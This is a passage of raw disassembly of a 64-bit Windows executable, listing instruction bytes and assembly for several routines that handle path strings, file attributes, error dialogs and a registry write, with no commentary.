   1400040fa:	8b c3                	mov    %ebx,%eax
   1400040fc:	41 83 ce ff          	or     $0xffffffff,%r14d
   140004100:	48 98                	cltq
   140004102:	4c 8d 04 40          	lea    (%rax,%rax,2),%r8
   140004106:	42 3b 14 c6          	cmp    (%rsi,%r8,8),%edx
   14000410a:	73 05                	jae    0x140004111
   14000410c:	41 8b ce             	mov    %r14d,%ecx
   14000410f:	eb 1a                	jmp    0x14000412b
   140004111:	76 05                	jbe    0x140004118
   140004113:	41 8b cc             	mov    %r12d,%ecx
   140004116:	eb 13                	jmp    0x14000412b
   140004118:	48 63 c1             	movslq %ecx,%rax
   14000411b:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   14000411f:	44 3b 4c ce 04       	cmp    0x4(%rsi,%rcx,8),%r9d
   140004124:	72 e6                	jb     0x14000410c
   140004126:	8b cb                	mov    %ebx,%ecx
   140004128:	0f 97 c1             	seta   %cl
   14000412b:	42 3b 54 c6 0c       	cmp    0xc(%rsi,%r8,8),%edx
   140004130:	73 05                	jae    0x140004137
   140004132:	41 8b c6             	mov    %r14d,%eax
   140004135:	eb 13                	jmp    0x14000414a
   140004137:	76 05                	jbe    0x14000413e
   140004139:	41 8b c4             	mov    %r12d,%eax
   14000413c:	eb 0c                	jmp    0x14000414a
   14000413e:	46 3b 4c c6 10       	cmp    0x10(%rsi,%r8,8),%r9d
   140004143:	72 ed                	jb     0x140004132
   140004145:	8b c3                	mov    %ebx,%eax
   140004147:	0f 97 c0             	seta   %al
   14000414a:	85 c9                	test   %ecx,%ecx
   14000414c:	78 72                	js     0x1400041c0
   14000414e:	85 c0                	test   %eax,%eax
   140004150:	7f 6e                	jg     0x1400041c0
   140004152:	85 c9                	test   %ecx,%ecx
   140004154:	75 1e                	jne    0x140004174
   140004156:	85 c0                	test   %eax,%eax
   140004158:	75 11                	jne    0x14000416b
   14000415a:	41 8b c3             	mov    %r11d,%eax
   14000415d:	46 3b 5c c6 08       	cmp    0x8(%rsi,%r8,8),%r11d
   140004162:	72 1b                	jb     0x14000417f
   140004164:	42 3b 44 c6 14       	cmp    0x14(%rsi,%r8,8),%eax
   140004169:	eb 12                	jmp    0x14000417d
   14000416b:	46 3b 5c c6 08       	cmp    0x8(%rsi,%r8,8),%r11d
   140004170:	73 6a                	jae    0x1400041dc
   140004172:	eb 0b                	jmp    0x14000417f
   140004174:	85 c0                	test   %eax,%eax
   140004176:	75 64                	jne    0x1400041dc
   140004178:	46 3b 5c c6 14       	cmp    0x14(%rsi,%r8,8),%r11d
   14000417d:	76 5d                	jbe    0x1400041dc
   14000417f:	45 85 ed             	test   %r13d,%r13d
   140004182:	74 41                	je     0x1400041c5
   140004184:	44 8b f3             	mov    %ebx,%r14d
   140004187:	4c 8b fb             	mov    %rbx,%r15
   14000418a:	4c 8b cb             	mov    %rbx,%r9
   14000418d:	bf 4c 05 00 00       	mov    $0x54c,%edi
   140004192:	48 85 f6             	test   %rsi,%rsi
   140004195:	0f 84 a8 00 00 00    	je     0x140004243
   14000419b:	44 8b 7e 34          	mov    0x34(%rsi),%r15d
   14000419f:	8b 46 30             	mov    0x30(%rsi),%eax
   1400041a2:	49 81 c7 84 00 00 00 	add    $0x84,%r15
   1400041a9:	4d 03 fa             	add    %r10,%r15
   1400041ac:	41 84 c4             	test   %al,%r12b
   1400041af:	0f 84 80 00 00 00    	je     0x140004235
   1400041b5:	41 be 04 01 00 00    	mov    $0x104,%r14d
   1400041bb:	e9 83 00 00 00       	jmp    0x140004243
   1400041c0:	45 3b ec             	cmp    %r12d,%r13d
   1400041c3:	74 bf                	je     0x140004184
   1400041c5:	41 ff c5             	inc    %r13d
   1400041c8:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   1400041cd:	41 8b c5             	mov    %r13d,%eax
   1400041d0:	41 8b cd             	mov    %r13d,%ecx
   1400041d3:	45 3b ef             	cmp    %r15d,%r13d
   1400041d6:	0f 8c 24 ff ff ff    	jl     0x140004100
   1400041dc:	41 39 5a 7c          	cmp    %ebx,0x7c(%r10)
   1400041e0:	0f 84 f4 00 00 00    	je     0x1400042da
   1400041e6:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400041eb:	49 8b ca             	mov    %r10,%rcx
   1400041ee:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1400041f2:	e8 fd e2 ff ff       	call   0x1400024f4
   1400041f7:	85 c0                	test   %eax,%eax
   1400041f9:	0f 85 db 00 00 00    	jne    0x1400042da
   1400041ff:	4c 8b 54 24 38       	mov    0x38(%rsp),%r10
   140004204:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140004208:	4c 63 6c 24 30       	movslq 0x30(%rsp),%r13
   14000420d:	bf 4d 05 00 00       	mov    $0x54d,%edi
   140004212:	49 6b f5 3c          	imul   $0x3c,%r13,%rsi
   140004216:	41 8b 92 80 00 00 00 	mov    0x80(%r10),%edx
   14000421d:	4c 8b fb             	mov    %rbx,%r15
   140004220:	48 81 c6 84 00 00 00 	add    $0x84,%rsi
   140004227:	44 8b f3             	mov    %ebx,%r14d
   14000422a:	49 03 f2             	add    %r10,%rsi
   14000422d:	48 03 f2             	add    %rdx,%rsi
   140004230:	e9 5d ff ff ff       	jmp    0x140004192
   140004235:	24 02                	and    $0x2,%al
   140004237:	f6 d8                	neg    %al
   140004239:	45 1b f6             	sbb    %r14d,%r14d
   14000423c:	41 81 e6 01 01 00 00 	and    $0x101,%r14d
   140004243:	44 84 25 0e ac 00 00 	test   %r12b,0xac0e(%rip)        # 0x14000ee58
   14000424a:	75 72                	jne    0x1400042be
   14000424c:	4d 85 ff             	test   %r15,%r15
   14000424f:	74 6d                	je     0x1400042be
   140004251:	41 38 1f             	cmp    %bl,(%r15)
   140004254:	74 68                	je     0x1400042be
   140004256:	33 c9                	xor    %ecx,%ecx
   140004258:	48 ff 15 81 73 00 00 	rex.W call *0x7381(%rip)        # 0x14000b5e0
   14000425f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004264:	e8 b7 56 00 00       	call   0x140009920
   140004269:	85 c0                	test   %eax,%eax
   14000426b:	74 0e                	je     0x14000427b
   14000426d:	e8 d2 55 00 00       	call   0x140009844
   140004272:	85 c0                	test   %eax,%eax
   140004274:	b8 30 00 18 00       	mov    $0x180030,%eax
   140004279:	75 05                	jne    0x140004280
   14000427b:	b8 30 00 00 00       	mov    $0x30,%eax
   140004280:	41 0b c6             	or     %r14d,%eax
   140004283:	4c 8d 05 2e b4 00 00 	lea    0xb42e(%rip),%r8        # 0x14000f6b8
   14000428a:	44 8b c8             	mov    %eax,%r9d
   14000428d:	49 8b d7             	mov    %r15,%rdx
   140004290:	33 c9                	xor    %ecx,%ecx
   140004292:	48 ff 15 b7 73 00 00 	rex.W call *0x73b7(%rip)        # 0x14000b650
   140004299:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000429e:	41 f6 c6 04          	test   $0x4,%r14b
   1400042a2:	74 0c                	je     0x1400042b0
   1400042a4:	83 f8 06             	cmp    $0x6,%eax
   1400042a7:	8b cb                	mov    %ebx,%ecx
   1400042a9:	0f 45 cf             	cmovne %edi,%ecx
   1400042ac:	8b f9                	mov    %ecx,%edi
   1400042ae:	eb 2a                	jmp    0x1400042da
   1400042b0:	45 84 f4             	test   %r14b,%r12b
   1400042b3:	74 25                	je     0x1400042da
   1400042b5:	41 3b c4             	cmp    %r12d,%eax
   1400042b8:	75 20                	jne    0x1400042da
   1400042ba:	8b fb                	mov    %ebx,%edi
   1400042bc:	eb 1c                	jmp    0x1400042da
   1400042be:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400042c2:	4c 8d 05 ef b3 00 00 	lea    0xb3ef(%rip),%r8        # 0x14000f6b8
   1400042c9:	c7 44 24 20 30 00 00 	movl   $0x30,0x20(%rsp)
   1400042d0:	00 
   1400042d1:	8b d7                	mov    %edi,%edx
   1400042d3:	33 c9                	xor    %ecx,%ecx
   1400042d5:	e8 fe 20 00 00       	call   0x1400063d8
   1400042da:	85 ff                	test   %edi,%edi
   1400042dc:	0f 94 c3             	sete   %bl
   1400042df:	8b c3                	mov    %ebx,%eax
   1400042e1:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   1400042e8:	48 33 cc             	xor    %rsp,%rcx
   1400042eb:	e8 c0 58 00 00       	call   0x140009bb0
   1400042f0:	4c 8d 9c 24 00 02 00 	lea    0x200(%rsp),%r11
   1400042f7:	00 
   1400042f8:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400042fc:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004300:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140004304:	49 8b e3             	mov    %r11,%rsp
   140004307:	41 5f                	pop    %r15
   140004309:	41 5e                	pop    %r14
   14000430b:	41 5d                	pop    %r13
   14000430d:	41 5c                	pop    %r12
   14000430f:	5d                   	pop    %rbp
   140004310:	c3                   	ret
   140004311:	cc                   	int3
   140004312:	cc                   	int3
   140004313:	cc                   	int3
   140004314:	cc                   	int3
   140004315:	cc                   	int3
   140004316:	cc                   	int3
   140004317:	cc                   	int3
   140004318:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000431d:	57                   	push   %rdi
   14000431e:	48 83 ec 30          	sub    $0x30,%rsp
   140004322:	48 8b f9             	mov    %rcx,%rdi
   140004325:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000432a:	48 ff 15 bf 6f 00 00 	rex.W call *0x6fbf(%rip)        # 0x14000b2f0
   140004331:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004336:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004339:	74 70                	je     0x1400043ab
   14000433b:	a8 10                	test   $0x10,%al
   14000433d:	75 6c                	jne    0x1400043ab
   14000433f:	83 3d fa b3 00 00 00 	cmpl   $0x0,0xb3fa(%rip)        # 0x14000f740
   140004346:	75 4f                	jne    0x140004397
   140004348:	84 1d 0a ab 00 00    	test   %bl,0xab0a(%rip)        # 0x14000ee58
   14000434e:	75 47                	jne    0x140004397
   140004350:	4c 8b 05 91 a5 00 00 	mov    0xa591(%rip),%r8        # 0x14000e8e8
   140004357:	4c 8d 0d c2 25 00 00 	lea    0x25c2(%rip),%r9        # 0x140006920
   14000435e:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   140004365:	00 00 
   140004367:	ba d3 07 00 00       	mov    $0x7d3,%edx
   14000436c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004372:	48 89 3d f7 b5 00 00 	mov    %rdi,0xb5f7(%rip)        # 0x14000f970
   140004379:	e8 22 23 00 00       	call   0x1400066a0
   14000437e:	48 83 e8 06          	sub    $0x6,%rax
   140004382:	74 13                	je     0x140004397
   140004384:	48 2b c3             	sub    %rbx,%rax
   140004387:	74 30                	je     0x1400043b9
   140004389:	48 3d 32 08 00 00    	cmp    $0x832,%rax
   14000438f:	75 06                	jne    0x140004397
   140004391:	89 1d a9 b3 00 00    	mov    %ebx,0xb3a9(%rip)        # 0x14000f740
   140004397:	ba 80 00 00 00       	mov    $0x80,%edx
   14000439c:	48 8b cf             	mov    %rdi,%rcx
   14000439f:	48 ff 15 9a 6f 00 00 	rex.W call *0x6f9a(%rip)        # 0x14000b340
   1400043a6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400043ab:	8b c3                	mov    %ebx,%eax
   1400043ad:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400043b2:	48 83 c4 30          	add    $0x30,%rsp
   1400043b6:	5f                   	pop    %rdi
   1400043b7:	c3                   	ret
   1400043b8:	cc                   	int3
   1400043b9:	33 db                	xor    %ebx,%ebx
   1400043bb:	eb ee                	jmp    0x1400043ab
   1400043bd:	cc                   	int3
   1400043be:	cc                   	int3
   1400043bf:	cc                   	int3
   1400043c0:	cc                   	int3
   1400043c1:	cc                   	int3
   1400043c2:	cc                   	int3
   1400043c3:	cc                   	int3
   1400043c4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400043c9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400043ce:	57                   	push   %rdi
   1400043cf:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   1400043d6:	48 8b 05 a3 9c 00 00 	mov    0x9ca3(%rip),%rax        # 0x14000e080
   1400043dd:	48 33 c4             	xor    %rsp,%rax
   1400043e0:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   1400043e7:	00 
   1400043e8:	41 8b f0             	mov    %r8d,%esi
   1400043eb:	4c 8b c9             	mov    %rcx,%r9
   1400043ee:	85 d2                	test   %edx,%edx
   1400043f0:	0f 84 db 00 00 00    	je     0x1400044d1
   1400043f6:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400043fb:	e8 e4 0d 00 00       	call   0x1400051e4
   140004400:	85 c0                	test   %eax,%eax
   140004402:	0f 84 7e 01 00 00    	je     0x140004586
   140004408:	48 8d 1d 41 b3 00 00 	lea    0xb341(%rip),%rbx        # 0x14000f750
   14000440f:	bf 04 01 00 00       	mov    $0x104,%edi
   140004414:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004419:	8b d7                	mov    %edi,%edx
   14000441b:	48 8b cb             	mov    %rbx,%rcx
   14000441e:	4c 2b c3             	sub    %rbx,%r8
   140004421:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140004428:	48 85 c0             	test   %rax,%rax
   14000442b:	74 13                	je     0x140004440
   14000442d:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140004431:	84 c0                	test   %al,%al
   140004433:	74 0b                	je     0x140004440
   140004435:	88 01                	mov    %al,(%rcx)
   140004437:	48 ff c1             	inc    %rcx
   14000443a:	48 83 ea 01          	sub    $0x1,%rdx
   14000443e:	75 e1                	jne    0x140004421
   140004440:	48 85 d2             	test   %rdx,%rdx
   140004443:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140004447:	48 0f 45 c1          	cmovne %rcx,%rax
   14000444b:	c6 00 00             	movb   $0x0,(%rax)
   14000444e:	f6 05 4f bb 00 00 20 	testb  $0x20,0xbb4f(%rip)        # 0x14000ffa4
   140004455:	74 67                	je     0x1400044be
   140004457:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000445a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000445f:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140004464:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004469:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000446e:	48 ff 15 db 6f 00 00 	rex.W call *0x6fdb(%rip)        # 0x14000b450
   140004475:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000447a:	0f b7 4c 24 20       	movzwl 0x20(%rsp),%ecx
   14000447f:	85 c9                	test   %ecx,%ecx
   140004481:	74 2a                	je     0x1400044ad
   140004483:	83 e9 01             	sub    $0x1,%ecx
   140004486:	74 1c                	je     0x1400044a4
   140004488:	83 e9 01             	sub    $0x1,%ecx
   14000448b:	74 0e                	je     0x14000449b
   14000448d:	83 f9 01             	cmp    $0x1,%ecx
   140004490:	75 2c                	jne    0x1400044be
   140004492:	4c 8d 05 37 77 00 00 	lea    0x7737(%rip),%r8        # 0x14000bbd0
   140004499:	eb 19                	jmp    0x1400044b4
   14000449b:	4c 8d 05 26 77 00 00 	lea    0x7726(%rip),%r8        # 0x14000bbc8
   1400044a2:	eb 10                	jmp    0x1400044b4
   1400044a4:	4c 8d 05 15 77 00 00 	lea    0x7715(%rip),%r8        # 0x14000bbc0
   1400044ab:	eb 07                	jmp    0x1400044b4
   1400044ad:	4c 8d 05 04 77 00 00 	lea    0x7704(%rip),%r8        # 0x14000bbb8
   1400044b4:	8b d7                	mov    %edi,%edx
   1400044b6:	48 8b cb             	mov    %rbx,%rcx
   1400044b9:	e8 1e 51 00 00       	call   0x1400095dc
   1400044be:	4c 8d 05 6b 73 00 00 	lea    0x736b(%rip),%r8        # 0x14000b830
   1400044c5:	8b d7                	mov    %edi,%edx
   1400044c7:	48 8b cb             	mov    %rbx,%rcx
   1400044ca:	e8 0d 51 00 00       	call   0x1400095dc
   1400044cf:	eb 3f                	jmp    0x140004510
   1400044d1:	48 8d 1d 78 b2 00 00 	lea    0xb278(%rip),%rbx        # 0x14000f750
   1400044d8:	bf 04 01 00 00       	mov    $0x104,%edi
   1400044dd:	48 8b cb             	mov    %rbx,%rcx
   1400044e0:	4c 2b cb             	sub    %rbx,%r9
   1400044e3:	48 8d 87 fa fe ff 7f 	lea    0x7ffffefa(%rdi),%rax
   1400044ea:	48 85 c0             	test   %rax,%rax
   1400044ed:	74 13                	je     0x140004502
   1400044ef:	41 8a 04 09          	mov    (%r9,%rcx,1),%al
   1400044f3:	84 c0                	test   %al,%al
   1400044f5:	74 0b                	je     0x140004502
   1400044f7:	88 01                	mov    %al,(%rcx)
   1400044f9:	48 ff c1             	inc    %rcx
   1400044fc:	48 83 ef 01          	sub    $0x1,%rdi
   140004500:	75 e1                	jne    0x1400044e3
   140004502:	48 85 ff             	test   %rdi,%rdi
   140004505:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140004509:	48 0f 45 c1          	cmovne %rcx,%rax
   14000450d:	c6 00 00             	movb   $0x0,(%rax)
   140004510:	48 8b cb             	mov    %rbx,%rcx
   140004513:	e8 c4 1b 00 00       	call   0x1400060dc
   140004518:	85 c0                	test   %eax,%eax
   14000451a:	75 1f                	jne    0x14000453b
   14000451c:	33 d2                	xor    %edx,%edx
   14000451e:	48 8b cb             	mov    %rbx,%rcx
   140004521:	48 ff 15 50 6e 00 00 	rex.W call *0x6e50(%rip)        # 0x14000b378
   140004528:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000452d:	85 c0                	test   %eax,%eax
   14000452f:	74 29                	je     0x14000455a
   140004531:	c7 05 05 a9 00 00 01 	movl   $0x1,0xa905(%rip)        # 0x14000ee40
   140004538:	00 00 00 
   14000453b:	45 33 c0             	xor    %r8d,%r8d
   14000453e:	8b d6                	mov    %esi,%edx
   140004540:	48 8b cb             	mov    %rbx,%rcx
   140004543:	e8 04 18 00 00       	call   0x140005d4c
   140004548:	85 c0                	test   %eax,%eax
   14000454a:	74 1b                	je     0x140004567
   14000454c:	83 25 31 b1 00 00 00 	andl   $0x0,0xb131(%rip)        # 0x14000f684
   140004553:	b8 01 00 00 00       	mov    $0x1,%eax
   140004558:	eb 2e                	jmp    0x140004588
   14000455a:	e8 21 22 00 00       	call   0x140006780
   14000455f:	89 05 1f b1 00 00    	mov    %eax,0xb11f(%rip)        # 0x14000f684
   140004565:	eb 1f                	jmp    0x140004586
   140004567:	83 3d d2 a8 00 00 00 	cmpl   $0x0,0xa8d2(%rip)        # 0x14000ee40
   14000456e:	74 16                	je     0x140004586
   140004570:	83 25 c9 a8 00 00 00 	andl   $0x0,0xa8c9(%rip)        # 0x14000ee40
   140004577:	48 8b cb             	mov    %rbx,%rcx
   14000457a:	48 ff 15 df 6d 00 00 	rex.W call *0x6ddf(%rip)        # 0x14000b360
   140004581:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004586:	33 c0                	xor    %eax,%eax
   140004588:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   14000458f:	00 
   140004590:	48 33 cc             	xor    %rsp,%rcx
   140004593:	e8 18 56 00 00       	call   0x140009bb0
   140004598:	4c 8d 9c 24 70 01 00 	lea    0x170(%rsp),%r11
   14000459f:	00 
   1400045a0:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400045a4:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400045a8:	49 8b e3             	mov    %r11,%rsp
   1400045ab:	5f                   	pop    %rdi
   1400045ac:	c3                   	ret
   1400045ad:	cc                   	int3
   1400045ae:	cc                   	int3
   1400045af:	cc                   	int3
   1400045b0:	cc                   	int3
   1400045b1:	cc                   	int3
   1400045b2:	cc                   	int3
   1400045b3:	cc                   	int3
   1400045b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400045b9:	57                   	push   %rdi
   1400045ba:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400045c1:	48 8b 05 b8 9a 00 00 	mov    0x9ab8(%rip),%rax        # 0x14000e080
   1400045c8:	48 33 c4             	xor    %rsp,%rax
   1400045cb:	48 89 84 24 50 01 00 	mov    %rax,0x150(%rsp)
   1400045d2:	00 
   1400045d3:	48 8b 1d 6e b1 00 00 	mov    0xb16e(%rip),%rbx        # 0x14000f748
   1400045da:	eb 5a                	jmp    0x140004636
   1400045dc:	83 3d 61 a8 00 00 00 	cmpl   $0x0,0xa861(%rip)        # 0x14000ee44
   1400045e3:	48 8b fb             	mov    %rbx,%rdi
   1400045e6:	75 2c                	jne    0x140004614
   1400045e8:	83 3d b1 b9 00 00 00 	cmpl   $0x0,0xb9b1(%rip)        # 0x14000ffa0
   1400045ef:	75 23                	jne    0x140004614
   1400045f1:	48 8b 0b             	mov    (%rbx),%rcx
   1400045f4:	ba 80 00 00 00       	mov    $0x80,%edx
   1400045f9:	48 ff 15 40 6d 00 00 	rex.W call *0x6d40(%rip)        # 0x14000b340
   140004600:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004605:	48 8b 0b             	mov    (%rbx),%rcx
   140004608:	48 ff 15 f9 6c 00 00 	rex.W call *0x6cf9(%rip)        # 0x14000b308
   14000460f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004614:	48 8b 0f             	mov    (%rdi),%rcx
   140004617:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   14000461b:	48 ff 15 36 6d 00 00 	rex.W call *0x6d36(%rip)        # 0x14000b358
   140004622:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004627:	48 8b cf             	mov    %rdi,%rcx
   14000462a:	48 ff 15 27 6d 00 00 	rex.W call *0x6d27(%rip)        # 0x14000b358
   140004631:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004636:	48 85 db             	test   %rbx,%rbx
   140004639:	75 a1                	jne    0x1400045dc
   14000463b:	8b 05 ff a7 00 00    	mov    0xa7ff(%rip),%eax        # 0x14000ee40
   140004641:	bb 01 00 00 00       	mov    $0x1,%ebx
   140004646:	85 c0                	test   %eax,%eax
   140004648:	0f 84 91 00 00 00    	je     0x1400046df
   14000464e:	83 3d ef a7 00 00 00 	cmpl   $0x0,0xa7ef(%rip)        # 0x14000ee44
   140004655:	0f 85 84 00 00 00    	jne    0x1400046df
   14000465b:	83 3d 3e b9 00 00 00 	cmpl   $0x0,0xb93e(%rip)        # 0x14000ffa0
   140004662:	75 7b                	jne    0x1400046df
   140004664:	4c 8d 05 e5 b0 00 00 	lea    0xb0e5(%rip),%r8        # 0x14000f750
   14000466b:	ba 04 01 00 00       	mov    $0x104,%edx
   140004670:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140004675:	4c 2b c0             	sub    %rax,%r8
   140004678:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000467d:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140004684:	48 85 c0             	test   %rax,%rax
   140004687:	74 12                	je     0x14000469b
   140004689:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   14000468d:	84 c0                	test   %al,%al
   14000468f:	74 0a                	je     0x14000469b
   140004691:	88 01                	mov    %al,(%rcx)
   140004693:	48 03 cb             	add    %rbx,%rcx
   140004696:	48 2b d3             	sub    %rbx,%rdx
   140004699:	75 e2                	jne    0x14000467d
   14000469b:	48 85 d2             	test   %rdx,%rdx
   14000469e:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400046a2:	48 0f 45 c1          	cmovne %rcx,%rax
   1400046a6:	f6 05 f7 b8 00 00 20 	testb  $0x20,0xb8f7(%rip)        # 0x14000ffa4
   1400046ad:	c6 00 00             	movb   $0x0,(%rax)
   1400046b0:	74 0a                	je     0x1400046bc
   1400046b2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400046b7:	e8 b8 4f 00 00       	call   0x140009674
   1400046bc:	48 8d 0d 3d 72 00 00 	lea    0x723d(%rip),%rcx        # 0x14000b900
   1400046c3:	48 ff 15 46 6d 00 00 	rex.W call *0x6d46(%rip)        # 0x14000b410
   1400046ca:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400046cf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400046d4:	e8 9b e1 ff ff       	call   0x140002874
   1400046d9:	8b 05 61 a7 00 00    	mov    0xa761(%rip),%eax        # 0x14000ee40
   1400046df:	66 39 1d d2 b8 00 00 	cmp    %bx,0xb8d2(%rip)        # 0x14000ffb8
   1400046e6:	74 6d                	je     0x140004755
   1400046e8:	85 c0                	test   %eax,%eax
   1400046ea:	74 69                	je     0x140004755
   1400046ec:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400046f2:	80 3d 77 a1 00 00 00 	cmpb   $0x0,0xa177(%rip)        # 0x14000e870
   1400046f9:	74 5a                	je     0x140004755
   1400046fb:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004700:	41 b9 06 00 02 00    	mov    $0x20006,%r9d
   140004706:	45 33 c0             	xor    %r8d,%r8d
   140004709:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000470e:	48 8d 15 23 9a 00 00 	lea    0x9a23(%rip),%rdx        # 0x14000e138
   140004715:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000471c:	48 ff 15 e5 6a 00 00 	rex.W call *0x6ae5(%rip)        # 0x14000b208
   140004723:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004728:	85 c0                	test   %eax,%eax
   14000472a:	75 29                	jne    0x140004755
   14000472c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004731:	48 8d 15 38 a1 00 00 	lea    0xa138(%rip),%rdx        # 0x14000e870
   140004738:	48 ff 15 c1 6a 00 00 	rex.W call *0x6ac1(%rip)        # 0x14000b200
   14000473f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004744:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004749:	48 ff 15 08 6b 00 00 	rex.W call *0x6b08(%rip)        # 0x14000b258
   140004750:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004755:	83 25 e4 a6 00 00 00 	andl   $0x0,0xa6e4(%rip)        # 0x14000ee40
   14000475c:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   140004763:	00 
   140004764:	48 33 cc             	xor    %rsp,%rcx
   140004767:	e8 44 54 00 00       	call   0x140009bb0
   14000476c:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   140004773:	00 
   140004774:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   14000477b:	5f                   	pop    %rdi
   14000477c:	c3                   	ret
   14000477d:	cc                   	int3
   14000477e:	cc                   	int3
   14000477f:	cc                   	int3
   140004780:	cc                   	int3
   140004781:	cc                   	int3
   140004782:	cc                   	int3
   140004783:	cc                   	int3
   140004784:	40 53                	rex push %rbx
   140004786:	48 83 ec 30          	sub    $0x30,%rsp
   14000478a:	45 33 c0             	xor    %r8d,%r8d
   14000478d:	48 8d 0d 34 73 00 00 	lea    0x7334(%rip),%rcx        # 0x14000bac8
   140004794:	33 d2                	xor    %edx,%edx
   140004796:	e8 b1 0b 00 00       	call   0x14000534c
   14000479b:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400047a0:	8b d8                	mov    %eax,%ebx
   1400047a2:	8d 50 01             	lea    0x1(%rax),%edx
   1400047a5:	48 ff 15 14 6d 00 00 	rex.W call *0x6d14(%rip)        # 0x14000b4c0
   1400047ac:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400047b1:	48 89 05 b8 a9 00 00 	mov    %rax,0xa9b8(%rip)        # 0x14000f170
   1400047b8:	48 85 c0             	test   %rax,%rax
   1400047bb:	75 30                	jne    0x1400047ed
   1400047bd:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400047c1:	45 33 c9             	xor    %r9d,%r9d
   1400047c4:	45 33 c0             	xor    %r8d,%r8d
   1400047c7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400047ce:	00 
   1400047cf:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400047d4:	33 c9                	xor    %ecx,%ecx
   1400047d6:	e8 fd 1b 00 00       	call   0x1400063d8
   1400047db:	e8 a0 1f 00 00       	call   0x140006780
   1400047e0:	89 05 9e ae 00 00    	mov    %eax,0xae9e(%rip)        # 0x14000f684
   1400047e6:	33 c0                	xor    %eax,%eax
   1400047e8:	e9 da 00 00 00       	jmp    0x1400048c7
   1400047ed:	44 8b c3             	mov    %ebx,%r8d
   1400047f0:	48 8d 0d d1 72 00 00 	lea    0x72d1(%rip),%rcx        # 0x14000bac8
   1400047f7:	48 8b d0             	mov    %rax,%rdx
   1400047fa:	e8 4d 0b 00 00       	call   0x14000534c
   1400047ff:	85 c0                	test   %eax,%eax
   140004801:	75 3d                	jne    0x140004840
   140004803:	21 44 24 28          	and    %eax,0x28(%rsp)
   140004807:	45 33 c9             	xor    %r9d,%r9d
   14000480a:	45 33 c0             	xor    %r8d,%r8d
   14000480d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004814:	00 
   140004815:	ba b1 04 00 00       	mov    $0x4b1,%edx
   14000481a:	33 c9                	xor    %ecx,%ecx
